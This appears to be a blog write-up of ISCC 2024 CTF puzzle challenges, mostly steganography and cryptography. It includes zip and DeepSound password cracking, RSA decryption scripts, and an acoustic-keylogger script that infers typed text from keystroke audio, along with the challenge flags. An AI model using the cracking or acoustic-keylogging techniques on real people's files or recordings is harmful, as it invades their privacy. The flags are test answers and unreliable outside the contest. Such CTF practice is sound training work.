<p>192.168.1.3,192.168.1.5,0.06 192.168.1.2,192.168.1.3,192.168.1.6 CRC16,4,1 ISCC{192.168.1.2,192.168.1.4,24,2024,192.168.1.3,192.168.1.5,0.06,192.168.1.2,192.168.1.3,192.168.1.6,CRC16,4,1} ISCC{192.168.1.2,192.168.1.4,24,2024,192.168.1.3,192.168.1.5,0.06,192.168.1.2,192.168.1.3,192.168.1.6,CRC16,4,1}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66420df641a66.png" alt="image-20240513205621560"></p>
<h4 id="精装四合一"><a href="#精装四合一" class="headerlink" title="精装四合一"></a>精装四合一</h4><p>四个png</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66420e689795e.png" alt="image-20240513205815890"></p>
<p>010editer打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664216456120c.png" alt="image-20240513213148500"></p>
<p>发现这四张图片有共同的部分：16进制下的AE426082及之前的都是相同的</p>
<p>于是将这四张图片的这相同的部分删除，并与0xff异或</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642179b28c80.png" alt="image-20240513213730263"></p>
<p>跑脚本 将这四张图片转成一个zip压缩包 得到一个带密码的压缩包文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;left_foot_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;left_hand_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f3 = <span class="built_in">open</span>(<span class="string">&#x27;right_foot_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f4 = <span class="built_in">open</span>(<span class="string">&#x27;right_hand_invert.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f5 = <span class="built_in">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3176</span>):</span><br><span class="line">    f5.write(f1.read(<span class="number">1</span>))</span><br><span class="line">    f5.write(f2.read(<span class="number">1</span>))</span><br><span class="line">    f5.write(f3.read(<span class="number">1</span>))</span><br><span class="line">    f5.write(f4.read(<span class="number">1</span>))</span><br><span class="line">f5.write(f1.read(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642198e0475a.png" alt="image-20240513214549288"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66421c553da2c.png" alt="image-20240513215740393"></p>
<p>使用ziperello爆破密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66421c8952c36.png" alt="image-20240513215832631"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66421cc44b358.png" alt="image-20240513215931554"></p>
<p>解压</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66421d1570c1d.png" alt="image-20240513220052642"></p>
<p>将.docx改为.zip 解压</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66421d4d107b3.png" alt="image-20240513220148273"></p>
<p>在word&#x2F;document.xml文件中发现了一串数字</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66421d9e55353.png" alt="image-20240513220309482"></p>
<p>是n分解</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66421df1dac9e.png" alt="image-20240513220433112"></p>
<p>在word&#x2F;media目录下发现了true_flag.jpeg</p>
<p>跑脚本进行RSA解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">16920251144570812336430166924811515273080382783829495988294341496740639931651</span></span><br><span class="line">p = <span class="number">100882503720822822072470797230485840381</span></span><br><span class="line">q = <span class="number">167722355418488286110758738271573756671</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;true_flag.jpeg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664225ac0cbe6.png" alt="image-20240513223731067"></p>
<h4 id="有人让我给你带个话"><a href="#有人让我给你带个话" class="headerlink" title="有人让我给你带个话"></a>有人让我给你带个话</h4><p>解压出来两个：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc359088e.png" alt="image-20240520211938520"></p>
<p>直接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -e Tony.png</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc36abd14.png" alt="image-20240520214217499"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35bd751.png" alt="image-20240520214414576"></p>
<p>分离出一张名为lyra.png的图片</p>
<p>搭建Lyra语音压缩编解码器环境，将 有人和你说了一些东西 解码</p>
<p>然后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bazel build -c opt lyra/cli_example:decoder_main</span><br><span class="line"></span><br><span class="line">bazel-bin/lyra/cli_example/decoder_main --encoded_path=input.lyra --output_dir=output</span><br></pre></td></tr></table></figure>

<p>去看output文件 里面有一个wav文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3648201.png" alt="image-20240520221306310"></p>
<p>然后进行语音识别</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc353071f.png" alt="image-20240520221405056"></p>
<p>发现是社会主义核心价值观解码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35bd74e.png" alt="image-20240520221432366"></p>
<p>所以：</p>
<p>ISCC{BKF2AUYM4CXL}</p>
<h4 id="钢铁侠在解密"><a href="#钢铁侠在解密" class="headerlink" title="钢铁侠在解密"></a>钢铁侠在解密</h4><p>直接SilentEye</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3626e84.png" alt="image-20240520220327831"></p>
<p>分离出row_46.txt</p>
<p>从row_46.txt中得到c1和c2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35c25c3.png" alt="image-20240520220431403"></p>
<p>再结合一张小字条.txt:</p>
<p>跑脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def HGCD(a, b):</span><br><span class="line">    if 2 * b.degree() &lt;= a.degree() or a.degree() == 1:</span><br><span class="line">        return 1, 0, 0, 1</span><br><span class="line">    m = a.degree() // 2</span><br><span class="line">    a_top, a_bot = a.quo_rem(x ^ m)</span><br><span class="line">    b_top, b_bot = b.quo_rem(x ^ m)</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a_top, b_top)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    q, e = c.quo_rem(d)</span><br><span class="line">    d_top, d_bot = d.quo_rem(x ^ (m // 2))</span><br><span class="line">    e_top, e_bot = e.quo_rem(x ^ (m // 2))</span><br><span class="line">    S00, S01, S10, S11 = HGCD(d_top, e_top)</span><br><span class="line">    RET00 = S01 * R00 + (S00 - q * S01) * R10</span><br><span class="line">    RET01 = S01 * R01 + (S00 - q * S01) * R11</span><br><span class="line">    RET10 = S11 * R00 + (S10 - q * S11) * R10</span><br><span class="line">    RET11 = S11 * R01 + (S10 - q * S11) * R11</span><br><span class="line">    return RET00, RET01, RET10, RET11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GCD(a, b):</span><br><span class="line">    print(a.degree(), b.degree())</span><br><span class="line">    q, r = a.quo_rem(b)</span><br><span class="line">    if r == 0:</span><br><span class="line">        return b</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a, b)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    if d == 0:</span><br><span class="line">        return c.monic()</span><br><span class="line">    q, r = c.quo_rem(d)</span><br><span class="line">    if r == 0:</span><br><span class="line">        return d</span><br><span class="line">    return GCD(d, r)</span><br><span class="line">#填入你的</span><br><span class="line">c1 = 7117699533553404765969385131528285151338883874047219393513901029814899613106269453717071655030129172675347412105954430595550208331319039285488217857645434855450598615444320625125480776280699845905031957935929200678010599182556355228361791925834628474882973819407545131720315147867601310680575703760829182731040820140040334260615959579260885910684316027038899927510111879795075716063442014500311273770317366580295265150626308906058870244474287517539716259093648787486558289028160060146383240853216385418156708531398826125721674525484478695977276018081855744644420524312189516816706523758384677737740206780056214178591</span><br><span class="line">c2 =  669377958220530998982610007334541495452444932327889027701674265488674975296173916526403471415673489599324609944152078024856059305235027055537717831870910926982886484365295480915932635049328982650036966128603589077422350648610838397561368492808627898801217681531847113405878144009338568458330300883098347211123932957521175154078087448270703770013755603755495694142054956736866280513298095095072140518012960164840387268115809107484598575420588399507838816137068511738359026923196816227383685673279881086270565844040540990721264154589480590824198483107578842415945186127864550932032695515688193556824882941308500664944</span><br><span class="line">N = 14333611673783142269533986072221892120042043537656734360856590164188122242725003914350459078347531255332508629469837960098772139271345723909824739672964835254762978904635416440402619070985645389389404927628520300563003721921925991789638218429597072053352316704656855913499811263742752562137683270151792361591681078161140269916896950693743947015425843446590958629225545563635366985228666863861856912727775048741305004192164068930881720463095045582233773945480224557678337152700769274051268380831948998464841302024749660091030851843867128275500525355379659601067910067304244120384025022313676471378733553918638120029697</span><br><span class="line">e = 52595</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc36c5436.png" alt="image-20240520220630622"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc37734f9.png" alt="image-20240520220601327"></p>
<h4 id="magic-keyboard"><a href="#magic-keyboard" class="headerlink" title="magic-keyboard"></a>magic-keyboard</h4><p>之前做过相似的题 找不到了</p>
<p>找资料的时候也有其他题：<br><code>https://blog.csdn.net/zhang14916/article/details/120814969</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> acoustic_keylogger.audio_processing <span class="keyword">import</span> wav_read, detect_keystrokes, extract_features</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load audio data from the provided file</span></span><br><span class="line">audio_data = wav_read(<span class="string">&quot;./attachment-45.wav&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detect individual keystrokes within the audio data</span></span><br><span class="line">detected_keystrokes = detect_keystrokes(audio_data, sample_rate=<span class="number">48000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract features from each detected keystroke</span></span><br><span class="line">features_list = [extract_features(keystroke) <span class="keyword">for</span> keystroke <span class="keyword">in</span> detected_keystrokes]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalize the feature data</span></span><br><span class="line">scaler = MinMaxScaler()</span><br><span class="line">normalized_features = scaler.fit_transform(features_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a mapping of unique feature sets to alphabets</span></span><br><span class="line">letter_mapping = &#123;&#125;</span><br><span class="line">current_alphabet_code = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">encoded_phrase = []</span><br><span class="line"><span class="keyword">for</span> feature_set <span class="keyword">in</span> normalized_features:</span><br><span class="line">    <span class="keyword">if</span> feature_set[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> letter_mapping:</span><br><span class="line">        letter_mapping[feature_set[<span class="number">0</span>]] = current_alphabet_code</span><br><span class="line">        current_alphabet_code += <span class="number">1</span></span><br><span class="line">    encoded_phrase.append(letter_mapping[feature_set[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the numeric representation back to characters</span></span><br><span class="line">encoded_flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(code) <span class="keyword">for</span> code <span class="keyword">in</span> encoded_phrase)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the set of possible characters for permutation</span></span><br><span class="line">char_options = <span class="string">&#x27;01268acdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for permutations that result in a valid flag</span></span><br><span class="line"><span class="keyword">for</span> char_permutation <span class="keyword">in</span> itertools.permutations(char_options, <span class="number">9</span>):</span><br><span class="line">    char_translation = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;g&#x27;</span>: char_permutation[<span class="number">0</span>], <span class="string">&#x27;h&#x27;</span>: char_permutation[<span class="number">1</span>], <span class="string">&#x27;i&#x27;</span>: char_permutation[<span class="number">2</span>],</span><br><span class="line">        <span class="string">&#x27;j&#x27;</span>: char_permutation[<span class="number">3</span>], <span class="string">&#x27;k&#x27;</span>: char_permutation[<span class="number">4</span>], <span class="string">&#x27;l&#x27;</span>: char_permutation[<span class="number">5</span>],</span><br><span class="line">        <span class="string">&#x27;m&#x27;</span>: char_permutation[<span class="number">6</span>], <span class="string">&#x27;n&#x27;</span>: char_permutation[<span class="number">7</span>], <span class="string">&#x27;o&#x27;</span>: char_permutation[<span class="number">8</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Translate the encoded flag using the current permutation</span></span><br><span class="line">        translated_hex = <span class="string">&#x27;&#x27;</span>.join(char_translation.get(char, <span class="string">&#x27;?&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> encoded_flag)</span><br><span class="line">        flag_bytes = <span class="built_in">bytes</span>.fromhex(translated_hex)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Validate the flag criteria</span></span><br><span class="line">        <span class="keyword">if</span> flag_bytes.endswith(<span class="string">b&#x27;&#125;&#x27;</span>) <span class="keyword">and</span> <span class="string">b&#x27;human&#x27;</span> <span class="keyword">in</span> flag_bytes <span class="keyword">and</span> <span class="string">b&#x27;she&#x27;</span> <span class="keyword">in</span> flag_bytes <span class="keyword">and</span> <span class="string">b&#x27;is&#x27;</span> <span class="keyword">in</span> flag_bytes:</span><br><span class="line">            <span class="built_in">print</span>(flag_bytes)</span><br><span class="line">    <span class="keyword">except</span> ValueError:  <span class="comment"># Catch hexadecimal conversion errors silently</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>





<h3 id="擂台题"><a href="#擂台题" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="重“隐”"><a href="#重“隐”" class="headerlink" title="重“隐”"></a>重“隐”</h4><p>两个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc353e81b.png" alt="image-20240525133217634"></p>
<p>发现图片中藏了一个zip</p>
<p>foremost图片提取</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc364aa00.png" alt="image-20240525134041787"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc34d5339.png" alt="image-20240525134207920"></p>
<p>解压</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35ae576.png" alt="image-20240525134258143"></p>
<p>有密码</p>
<p>那我们回头看看音频文件</p>
<p>deepsound看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3547625.png" alt="image-20240525134628918"></p>
<p>用脚本deepsound2john来进行哈希提取</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3605ddf.png" alt="image-20240525134909706"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35b5fa9.png" alt="image-20240525135021808"></p>
<p>得到密码：teenager</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc350d240.png" alt="image-20240525135100029"></p>
<p>解密对应的音频得到一个文本文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3604d0a.png" alt="image-20240525135125158"></p>
<p>puzzle solve解密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35762a2.png" alt="image-20240525135153979"></p>
<p>发现密文</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3567847.png" alt="image-20240525135258562"></p>
<p>随波逐流解密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35ba872.png" alt="image-20240525135452588"></p>
<p>74_re2l_w4t3rm4rk} </p>
<p>拿到部分flag</p>
<p>再看音频文件</p>
<p>听起来像手机按键声</p>
<p>DTMF Decoder解密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3649258.png" alt="image-20240525135824040"></p>
<p>827342312231334132</p>
<p>然后转九键进行解密得到密码 URHDBDFGE</p>
<p>回头解压</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc352c2ef.png" alt="image-20240525140201722"></p>
<p>brainfuck解密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3632c97.png" alt="image-20240525140426277"></p>
<p>两端flag连起来</p>
<p>ISCC{y0u_f1nd_t74_re2l_w4t3rm4rk}</p>
<h4 id="Listen-to-a-symphony"><a href="#Listen-to-a-symphony" class="headerlink" title="Listen_to_a_symphony"></a>Listen_to_a_symphony</h4><p>两个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3623295.png" alt="image-20240525150226888"></p>
<p>但是发现</p>
<p>zip有密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3540670.png" alt="image-20240525150253432"></p>
<p>010打开master180</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3601e96.png" alt="image-20240525150337446"></p>
<p>发现头文件是png</p>
<p>Binwalk 提取出另一张图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc354682a.png" alt="image-20240525150416291"></p>
<p>题目给了hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc352f7e7.png" alt="image-20240525150437539"></p>
<p>猜测Mozart反转</p>
<p>解压成功</p>
<p>用软件识曲得到曲名 Requiem aeternam</p>
<p>听到后面有摩斯密码</p>
<p>解密</p>
<p>–.&#x2F;—&#x2F;—&#x2F;-</p>
<p>good</p>
<p>所以把四个单词拼接起来</p>
<p>ISCC{Mozart_good_Requiem_aeternam}</p>
<h4 id="World-Line"><a href="#World-Line" class="headerlink" title="World_Line"></a>World_Line</h4><p>两个文件夹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3546517.png" alt="image-20240525151446921"></p>
<p>β</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc362de89.png" alt="image-20240525151531220"></p>
<p>α</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc352edff.png" alt="image-20240525151552842"></p>
<p>flag1在β中的拼图文件中，在321_1972604.png里有个ISCC</p>
<p>flag2在β中的拼图文件中，位于123651123_9049  (0U_f4N).png，括号里就是flag2</p>
<p>flag3在β中的拼图文件夹的8787下，那个key的内容就是part3</p>
<p>flag4在RSA文件中，是NKCTF2024原题，直接拿NKCTF的脚本梭βase64.txt，然后词频一下就可以得到part4</p>
<p>才打了</p>
